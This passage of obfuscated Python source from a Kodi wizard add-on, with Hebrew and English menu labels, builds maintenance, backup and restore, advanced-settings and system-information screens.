	ADDON .openSettings ()#line:2432
def folderback ():#line:2435
    O0O000OO0O0OO0O0O =ADDON .getSetting ("path")#line:2436
    if O0O000OO0O0OO0O0O :#line:2437
      O0O000OO0O0OO0O0O =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2438
      ADDON .setSetting ("path",O0O000OO0O0OO0O0O )#line:2439
def backmyupbuild ():#line:2442
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2446
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2447
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2448
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2450
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2451
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2452
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2454
def maintMenu (view =None ):#line:2458
	OOOO00000000OO0O0 ='[B][COLOR green]ON[/COLOR][/B]';O00OO0O00O0O0OO0O ='[B][COLOR red]OFF[/COLOR][/B]'#line:2460
	O000OOOOO000O00O0 ='true'if AUTOCLEANUP =='true'else 'false'#line:2461
	O0OOOO00OOO0OOO00 ='true'if AUTOCACHE =='true'else 'false'#line:2462
	OOOO000OOOO00O0OO ='true'if AUTOPACKAGES =='true'else 'false'#line:2463
	OO00OOOOOO0O000OO ='true'if AUTOTHUMBS =='true'else 'false'#line:2464
	OOO0000O000OOO0O0 ='true'if SHOWMAINT =='true'else 'false'#line:2465
	OOOO0OO0OO0OOOO0O ='true'if INCLUDEVIDEO =='true'else 'false'#line:2466
	OO0OO000OOOO0OOOO ='true'if INCLUDEALL =='true'else 'false'#line:2467
	OO0O0OO00O00OOO0O ='true'if THIRDPARTY =='true'else 'false'#line:2468
	if wiz .Grab_Log (True )==False :OO0O000OO0O00O0OO =0 #line:2469
	else :OO0O000OO0O00O0OO =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2470
	if wiz .Grab_Log (True ,True )==False :OO00O000OO0OOO00O =0 #line:2471
	else :OO00O000OO0OOO00O =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2472
	OOOO000O000OO0O0O =int (OO0O000OO0O00O0OO )+int (OO00O000OO0OOO00O )#line:2473
	O0O0OOO0000O00O0O =str (OOOO000O000OO0O0O )+' Error(s) Found'if OOOO000O000OO0O0O >0 else 'None Found'#line:2474
	OO0O0O00000O00O0O =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2475
	if OO0OO000OOOO0OOOO =='true':#line:2476
		O00OOOO00O00O0O0O ='true'#line:2477
		O000OOOOO0OO0000O ='true'#line:2478
		OO0000OOOO00OOOOO ='true'#line:2479
		OO00OOOOOOOOOO0O0 ='true'#line:2480
		O00O000000O000OOO ='true'#line:2481
		OO0000O0OOOOO000O ='true'#line:2482
		OOO00O00000O00OOO ='true'#line:2483
		OOOO000OOOOO00OO0 ='true'#line:2484
	else :#line:2485
		O00OOOO00O00O0O0O ='true'if INCLUDEBOB =='true'else 'false'#line:2486
		O000OOOOO0OO0000O ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2487
		OO0000OOOO00OOOOO ='true'if INCLUDESPECTO =='true'else 'false'#line:2488
		OO00OOOOOOOOOO0O0 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2489
		O00O000000O000OOO ='true'if INCLUDEEXODUS =='true'else 'false'#line:2490
		OO0000O0OOOOO000O ='true'if INCLUDEONECHAN =='true'else 'false'#line:2491
		OOO00O00000O00OOO ='true'if INCLUDESALTS =='true'else 'false'#line:2492
		OOOO000OOOOO00OO0 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2493
	OOOOO0OOOO0O000OO =wiz .getSize (PACKAGES )#line:2494
	O0OO0OOO000000O0O =wiz .getSize (THUMBS )#line:2495
	O00O00OO00OOOO00O =wiz .getCacheSize ()#line:2496
	O0OOO0O0OO0OO00O0 =OOOOO0OOOO0O000OO +O0OO0OOO000000O0O +O00O00OO00OOOO00O #line:2497
	OO00000OOO00O0O00 =['Daily','Always','3 Days','Weekly']#line:2498
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2499
	if view =="clean"or SHOWMAINT =='true':#line:2500
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OOO0O0OO0OO00O0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2501
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00O00OO00OOOO00O ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2502
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOOO0OOOO0O000OO ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2503
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OO0OOO000000O0O ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2504
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2505
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2506
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2507
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2508
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2509
	if view =="addon"or SHOWMAINT =='false':#line:2510
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2511
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2512
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2513
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2514
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2515
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2516
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2517
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2518
	if view =="misc"or SHOWMAINT =='true':#line:2519
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2520
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2521
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2522
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2523
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2524
		addFile ('View Errors in Log: %s'%(O0O0OOO0000O00O0O ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2525
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2526
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2527
		addFile ('Clear Wizard Log File%s'%OO0O0O00000O00O0O ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2528
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2529
	if view =="backup"or SHOWMAINT =='true':#line:2530
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2531
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2532
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2533
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2534
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2535
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2536
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2537
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2538
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2539
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2540
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2541
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2542
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2543
	if view =="tweaks"or SHOWMAINT =='true':#line:2544
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2545
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2546
		else :#line:2547
			if os .path .exists (ADVANCED ):#line:2548
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2549
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2550
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2551
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2552
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2553
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2554
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2555
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2556
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2557
	addFile ('Show All Maintenance: %s'%OOO0000O000OOO0O0 .replace ('true',OOOO00000000OO0O0 ).replace ('false',O00OO0O00O0O0OO0O ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2558
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2559
	addFile ('Third Party Wizards: %s'%OO0O0OO00O00OOO0O .replace ('true',OOOO00000000OO0O0 ).replace ('false',O00OO0O00O0O0OO0O ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2560
	if OO0O0OO00O00OOO0O =='true':#line:2561
		O0000O000000OOOO0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2562
		O0OO000O00OOO00O0 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2563
		OOOO0O0OOOO0O0OO0 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2564
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0000O000000OOOO0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2565
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0OO000O00OOO00O0 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2566
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOO0O0OOOO0O0OO0 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2567
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2568
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O000OOOOO000O00O0 .replace ('true',OOOO00000000OO0O0 ).replace ('false',O00OO0O00O0O0OO0O ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2569
	if O000OOOOO000O00O0 =='true':#line:2570
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OO00000OOO00O0O00 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2571
		addFile ('--- ניקוי קאש בהפעלה: %s'%O0OOOO00OOO0OOO00 .replace ('true',OOOO00000000OO0O0 ).replace ('false',O00OO0O00O0O0OO0O ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2572
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OOOO000OOOO00O0OO .replace ('true',OOOO00000000OO0O0 ).replace ('false',O00OO0O00O0O0OO0O ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2573
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OO00OOOOOO0O000OO .replace ('true',OOOO00000000OO0O0 ).replace ('false',O00OO0O00O0O0OO0O ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2574
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2575
	addFile ('Include Video Cache in Clear Cache: %s'%OOOO0OO0OO0OOOO0O .replace ('true',OOOO00000000OO0O0 ).replace ('false',O00OO0O00O0O0OO0O ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2576
	if OOOO0OO0OO0OOOO0O =='true':#line:2577
		addFile ('--- Include All Video Addons: %s'%OO0OO000OOOO0OOOO .replace ('true',OOOO00000000OO0O0 ).replace ('false',O00OO0O00O0O0OO0O ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2578
		addFile ('--- Include Bob: %s'%O00OOOO00O00O0O0O .replace ('true',OOOO00000000OO0O0 ).replace ('false',O00OO0O00O0O0OO0O ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2579
		addFile ('--- Include Phoenix: %s'%O000OOOOO0OO0000O .replace ('true',OOOO00000000OO0O0 ).replace ('false',O00OO0O00O0O0OO0O ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2580
		addFile ('--- Include Specto: %s'%OO0000OOOO00OOOOO .replace ('true',OOOO00000000OO0O0 ).replace ('false',O00OO0O00O0O0OO0O ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2581
		addFile ('--- Include Exodus: %s'%O00O000000O000OOO .replace ('true',OOOO00000000OO0O0 ).replace ('false',O00OO0O00O0O0OO0O ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2582
		addFile ('--- Include Salts: %s'%OOO00O00000O00OOO .replace ('true',OOOO00000000OO0O0 ).replace ('false',O00OO0O00O0O0OO0O ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2583
		addFile ('--- Include Salts HD Lite: %s'%OOOO000OOOOO00OO0 .replace ('true',OOOO00000000OO0O0 ).replace ('false',O00OO0O00O0O0OO0O ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2584
		addFile ('--- Include One Channel: %s'%OO0000O0OOOOO000O .replace ('true',OOOO00000000OO0O0 ).replace ('false',O00OO0O00O0O0OO0O ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2585
		addFile ('--- Include Genesis: %s'%OO00OOOOOOOOOO0O0 .replace ('true',OOOO00000000OO0O0 ).replace ('false',O00OO0O00O0O0OO0O ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2586
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2587
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2588
	setView ('files','viewType')#line:2589
def advancedWindow (url =None ):#line:2591
	if not ADVANCEDFILE =='http://':#line:2592
		if url ==None :#line:2593
			O0OO0OO00OOO00000 =wiz .workingURL (ADVANCEDFILE )#line:2594
			O0OOOOOOOOO000O0O =uservar .ADVANCEDFILE #line:2595
		else :#line:2596
			O0OO0OO00OOO00000 =wiz .workingURL (url )#line:2597
			O0OOOOOOOOO000O0O =url #line:2598
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2599
		if os .path .exists (ADVANCED ):#line:2600
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2601
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2602
		if O0OO0OO00OOO00000 ==True :#line:2603
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2604
			O0O0OO00O0O0O0O00 =wiz .openURL (O0OOOOOOOOO000O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2605
			O0000O00OOO0O000O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O0OO00O0O0O0O00 )#line:2606
			if len (O0000O00OOO0O000O )>0 :#line:2607
				for O0O0OO000O00OO000 ,O0OOO000000OOO00O ,url ,O0000OO0O0O00OO0O ,O0OOO0OO00OOO0OO0 ,OOO0000OO0O0O0O00 in O0000O00OOO0O000O :#line:2608
					if O0OOO000000OOO00O .lower ()=="yes":#line:2609
						addDir ("[B]%s[/B]"%O0O0OO000O00OO000 ,'advancedsetting',url ,description =OOO0000OO0O0O0O00 ,icon =O0000OO0O0O00OO0O ,fanart =O0OOO0OO00OOO0OO0 ,themeit =THEME3 )#line:2610
					else :#line:2611
						addFile (O0O0OO000O00OO000 ,'writeadvanced',O0O0OO000O00OO000 ,url ,description =OOO0000OO0O0O0O00 ,icon =O0000OO0O0O00OO0O ,fanart =O0OOO0OO00OOO0OO0 ,themeit =THEME2 )#line:2612
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2613
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O0OO0OO00OOO00000 )#line:2614
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2615
def writeAdvanced (OO0000O0OO00000O0 ,OOO0OOO0O0OOOO00O ):#line:2617
	OOO0O0O0OOO00000O =wiz .workingURL (OOO0OOO0O0OOOO00O )#line:2618
	if OOO0O0O0OOO00000O ==True :#line:2619
		if os .path .exists (ADVANCED ):O00OOO0000O0OOO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0000O0OO00000O0 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2620
		else :O00OOO0000O0OOO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0000O0OO00000O0 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2621
		if O00OOO0000O0OOO0O ==1 :#line:2623
			O0O0OOOOOOOOOO0O0 =wiz .openURL (OOO0OOO0O0OOOO00O )#line:2624
			O0O0O00O0OO000000 =open (ADVANCED ,'w');#line:2625
			O0O0O00O0OO000000 .write (O0O0OOOOOOOOOO0O0 )#line:2626
			O0O0O00O0OO000000 .close ()#line:2627
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2628
			wiz .killxbmc (True )#line:2629
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2630
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOO0O0O0OOO00000O );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2631
def viewAdvanced ():#line:2633
	OO0O000OO00OOOO0O =open (ADVANCED )#line:2634
	O0O00OO0000000O0O =OO0O000OO00OOOO0O .read ().replace ('\t','    ')#line:2635
	wiz .TextBox (ADDONTITLE ,O0O00OO0000000O0O )#line:2636
	OO0O000OO00OOOO0O .close ()#line:2637
def removeAdvanced ():#line:2639
	if os .path .exists (ADVANCED ):#line:2640
		wiz .removeFile (ADVANCED )#line:2641
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2642
def showAutoAdvanced ():#line:2644
	notify .autoConfig ()#line:2645
def getIP ():#line:2647
	OOOOOO00000O000O0 ='http://whatismyipaddress.com/'#line:2648
	if not wiz .workingURL (OOOOOO00000O000O0 ):return 'Unknown','Unknown','Unknown'#line:2649
	OO00O000OOOOOO0O0 =wiz .openURL (OOOOOO00000O000O0 ).replace ('\n','').replace ('\r','')#line:2650
	if not 'Access Denied'in OO00O000OOOOOO0O0 :#line:2651
		O0O00O000OOO0OOO0 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OO00O000OOOOOO0O0 )#line:2652
		OOOOO000O00OO0000 =O0O00O000OOO0OOO0 [0 ]if (len (O0O00O000OOO0OOO0 )>0 )else 'Unknown'#line:2653
		O0OO0OOOO0O00000O =re .compile ('"font-size:14px;">(.+?)</td>').findall (OO00O000OOOOOO0O0 )#line:2654
		O00O000O0OO00O0O0 =O0OO0OOOO0O00000O [0 ]if (len (O0OO0OOOO0O00000O )>0 )else 'Unknown'#line:2655
		OOO0OOOO0OO0O0000 =O0OO0OOOO0O00000O [1 ]+', '+O0OO0OOOO0O00000O [2 ]+', '+O0OO0OOOO0O00000O [3 ]if (len (O0OO0OOOO0O00000O )>2 )else 'Unknown'#line:2656
		return OOOOO000O00OO0000 ,O00O000O0OO00O0O0 ,OOO0OOOO0OO0O0000 #line:2657
	else :return 'Unknown','Unknown','Unknown'#line:2658
def systemInfo ():#line:2660
	OO0OOO00OOO000OO0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2674
	O0OOO00OO00O000O0 =[];O0O0O00O0O000O00O =0 #line:2675
	for O00OOO0000OO00OOO in OO0OOO00OOO000OO0 :#line:2676
		OO0OO000O00O00OOO =wiz .getInfo (O00OOO0000OO00OOO )#line:2677
		OOOO0OOO00OO0OOO0 =0 #line:2678
		while OO0OO000O00O00OOO =="Busy"and OOOO0OOO00OO0OOO0 <10 :#line:2679
			OO0OO000O00O00OOO =wiz .getInfo (O00OOO0000OO00OOO );OOOO0OOO00OO0OOO0 +=1 ;wiz .log ("%s sleep %s"%(O00OOO0000OO00OOO ,str (OOOO0OOO00OO0OOO0 )));xbmc .sleep (1000 )#line:2680
		O0OOO00OO00O000O0 .append (OO0OO000O00O00OOO )#line:2681
		O0O0O00O0O000O00O +=1 #line:2682
	OOOOO0OOOOOO0O00O =O0OOO00OO00O000O0 [8 ]if 'Una'in O0OOO00OO00O000O0 [8 ]else wiz .convertSize (int (float (O0OOO00OO00O000O0 [8 ][:-8 ]))*1024 *1024 )#line:2683
	OOOO0O0O0OOO0O00O =O0OOO00OO00O000O0 [9 ]if 'Una'in O0OOO00OO00O000O0 [9 ]else wiz .convertSize (int (float (O0OOO00OO00O000O0 [9 ][:-8 ]))*1024 *1024 )#line:2684
	OOOO0O00OO00O0OOO =O0OOO00OO00O000O0 [10 ]if 'Una'in O0OOO00OO00O000O0 [10 ]else wiz .convertSize (int (float (O0OOO00OO00O000O0 [10 ][:-8 ]))*1024 *1024 )#line:2685
	O0O0OOOOO00O00000 =wiz .convertSize (int (float (O0OOO00OO00O000O0 [11 ][:-2 ]))*1024 *1024 )#line:2686
	OO0O0O00O00OO0O00 =wiz .convertSize (int (float (O0OOO00OO00O000O0 [12 ][:-2 ]))*1024 *1024 )#line:2687
	OOO00OOO0OOOO000O =wiz .convertSize (int (float (O0OOO00OO00O000O0 [13 ][:-2 ]))*1024 *1024 )#line:2688
	O0O0O00O0O0O0OOOO ,OO0O0O0O0OOO0O0O0 ,OOO00O0O0OOOO0OO0 =getIP ()#line:2689
	O000OO00O00000OOO =[];OOO0O00000OO000OO =[];OO0O0OOO0OO0OOO0O =[];OO0O00OO00OO0O00O =[];OOOOO0OO0O0O00OO0 =[];OO0OOOO00OOO0OO00 =[];O00O00OO00O00O000 =[]#line:2691
	O0OO00OOOOOO0OOOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:2693
	for O0O0OO00OOOO00O0O in sorted (O0OO00OOOOOO0OOOO ,key =lambda O000OO0O0000O0OO0 :O000OO0O0000O0OO0 ):#line:2694
		O0000OO0OO0000O00 =os .path .split (O0O0OO00OOOO00O0O [:-1 ])[1 ]#line:2695
		if O0000OO0OO0000O00 =='packages':continue #line:2696
		OO000OO00O00OOOOO =os .path .join (O0O0OO00OOOO00O0O ,'addon.xml')#line:2697
		if os .path .exists (OO000OO00O00OOOOO ):#line:2698
			OOOO00OOOOOO0OOOO =open (OO000OO00O00OOOOO )#line:2699
			O0OOO00O000O000O0 =OOOO00OOOOOO0OOOO .read ()#line:2700
			OO0O00OOOOO0OO000 =re .compile ("<provides>(.+?)</provides>").findall (O0OOO00O000O000O0 )#line:2701
			if len (OO0O00OOOOO0OO000 )==0 :#line:2702
				if O0000OO0OO0000O00 .startswith ('skin'):O00O00OO00O00O000 .append (O0000OO0OO0000O00 )#line:2703
				if O0000OO0OO0000O00 .startswith ('repo'):OOOOO0OO0O0O00OO0 .append (O0000OO0OO0000O00 )#line:2704
				else :OO0OOOO00OOO0OO00 .append (O0000OO0OO0000O00 )#line:2705
			elif not (OO0O00OOOOO0OO000 [0 ]).find ('executable')==-1 :OO0O00OO00OO0O00O .append (O0000OO0OO0000O00 )#line:2706
			elif not (OO0O00OOOOO0OO000 [0 ]).find ('video')==-1 :OO0O0OOO0OO0OOO0O .append (O0000OO0OO0000O00 )#line:2707
			elif not (OO0O00OOOOO0OO000 [0 ]).find ('audio')==-1 :OOO0O00000OO000OO .append (O0000OO0OO0000O00 )#line:2708
			elif not (OO0O00OOOOO0OO000 [0 ]).find ('image')==-1 :O000OO00O00000OOO .append (O0000OO0OO0000O00 )#line:2709
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2711
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00OO00O000O0 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2712
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00OO00O000O0 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2713
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2714
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00OO00O000O0 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2715
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00OO00O000O0 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2716
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2718
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00OO00O000O0 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2719
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00OO00O000O0 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2720
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2722
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0OOOOOO0O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2723
